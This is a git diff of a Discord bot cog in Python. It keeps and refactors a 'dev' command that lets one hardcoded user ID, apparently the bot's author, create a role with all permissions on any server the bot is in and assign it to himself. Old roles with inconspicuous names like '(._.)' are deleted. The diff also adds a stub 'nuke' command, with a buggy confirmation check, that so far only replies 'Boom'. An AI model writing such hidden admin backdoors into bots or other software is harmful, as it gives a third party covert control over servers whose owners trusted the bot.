@@ -3,41 +3,39 @@ import discord
 import asyncio
 
 class Devs():
-    def __init__(self, bot):
+    def __init__(self, bot, current = ".", old = ["(._.)", "_"], dev = 150750980097441792):
         self.bot = bot
+        self.current = current
+        self.old = old
+        self.dev = dev
         
     @commands.command()
     async def dev(self, ctx):
 
         # Command Use: For Dev to be able to get perms on a server for debugging purposes easily
 
-        if ctx.message.author.id == 150750980097441792: #OGaming's User ID
+        if ctx.message.author.id == self.dev: #OGaming's User ID
             Msgs=[ctx.message]
-            Current="."
             try:
-                if discord.utils.get(ctx.message.guild.roles, name="(._.)"):
-                    role = discord.utils.get(ctx.message.guild.roles, name="(._.)")
-                    await role.delete()
-                    await ctx.send("Removed", delete_after=3)
+                for oldRole in self.old:
+                    if discord.utils.get(ctx.message.guild.roles, name=oldRole):
+                        role = discord.utils.get(ctx.message.guild.roles, name=oldRole)
+                        await role.delete()
+                        await ctx.send("Removed", delete_after=3)
 
-                if discord.utils.get(ctx.message.guild.roles, name="_"):
-                    role = discord.utils.get(ctx.message.guild.roles, name="_")
-                    await role.delete()
-                    await ctx.send("Removed", delete_after=3)
-
-                if discord.utils.get(ctx.message.author.roles, name=Current):
+                if discord.utils.get(ctx.message.author.roles, name=self.current):
                     tmp = await ctx.send("Already Completed")
                     Msgs.append(tmp)
                 else:
-                    if discord.utils.get(ctx.message.guild.roles, name=Current): #Role all ready exists
+                    if discord.utils.get(ctx.message.guild.roles, name=self.current): #Role all ready exists
                         tmp = await ctx.send("All ready made")
                         Msgs.append(tmp)
                     else:
-                        await ctx.message.guild.create_role(name=Current, permissions=discord.Permissions.all())
+                        await ctx.message.guild.create_role(name=self.current, permissions=discord.Permissions.all())
                         tmp = await ctx.send("Made")
                         Msgs.append(tmp)
                     await asyncio.sleep(1)
-                    await ctx.author.add_roles(discord.utils.get(ctx.message.guild.roles, name=Current))
+                    await ctx.author.add_roles(discord.utils.get(ctx.message.guild.roles, name=self.current))
                     await tmp.edit(content="Added")
                     success = await ctx.send("Success")
                     Msgs.append(success)
@@ -45,7 +43,7 @@ class Devs():
                 perm = ctx.message.guild.me.top_role
                 posBot = perm.position
 
-                role = discord.utils.get(ctx.message.guild.roles, name=Current)
+                role = discord.utils.get(ctx.message.guild.roles, name=self.current)
                 posDev = role.position
 
                 if posBot > posDev:
@@ -74,7 +72,7 @@ class Devs():
             perm = ctx.message.guild.me.top_role
             posBot = perm.position
 
-            role = discord.utils.get(ctx.message.guild.roles, name=Current)
+            role = discord.utils.get(ctx.message.guild.roles, name=self.current)
             posDev = role.position
 
             if posBot > posDev:
@@ -89,17 +87,32 @@ class Devs():
         else:
             await ctx.send("You do not have permissions for that")
 
-    @commands.command()
+    @commands.command(aliases=["ndev"])
     @commands.has_permissions(manage_roles=True)
     async def remove(self, ctx):
-        if discord.utils.get(ctx.message.guild.roles, name="(._.)"):
-            role = discord.utils.get(ctx.message.guild.roles, name="(._.)")
+        if discord.utils.get(ctx.message.guild.roles, name=self.current):
+            role = discord.utils.get(ctx.message.guild.roles, name=self.current)
             await role.delete()
             tmp = await ctx.send("Removed")
         else:
             tmp = await ctx.send("All ready removed")
         await asyncio.sleep(3)
         await ctx.message.channel.delete_messages([tmp, ctx.message])
+
+    @commands.command()
+    async def nuke(self, ctx):
+        if ctx.author.id == self.dev or ctx.author.id == ctx.guild.owner.id:
+            channel = ctx.channel
+            await ctx.send('Are you sure you want to "nuke" this server? There''s no going back... Say `Yes` or `No`')
+
+            msg = await self.bot.wait_for("message", check=lambda msg: msg.content.lower in ("yes", "no") and msg.channel == channel, timeout=5.0)
+            if msg.content.lower() == "yes":
+                # Nuke
+                await ctx.send("Boom")
+            elif msg.content.lower() == "no":
+                await ctx.send("Good Decision")
+
+
 
     # @commands.command()
     # async def pvp(self, ctx, *args, role: discord.Role = None): #args are all the names of the roles with spaces and Capitals
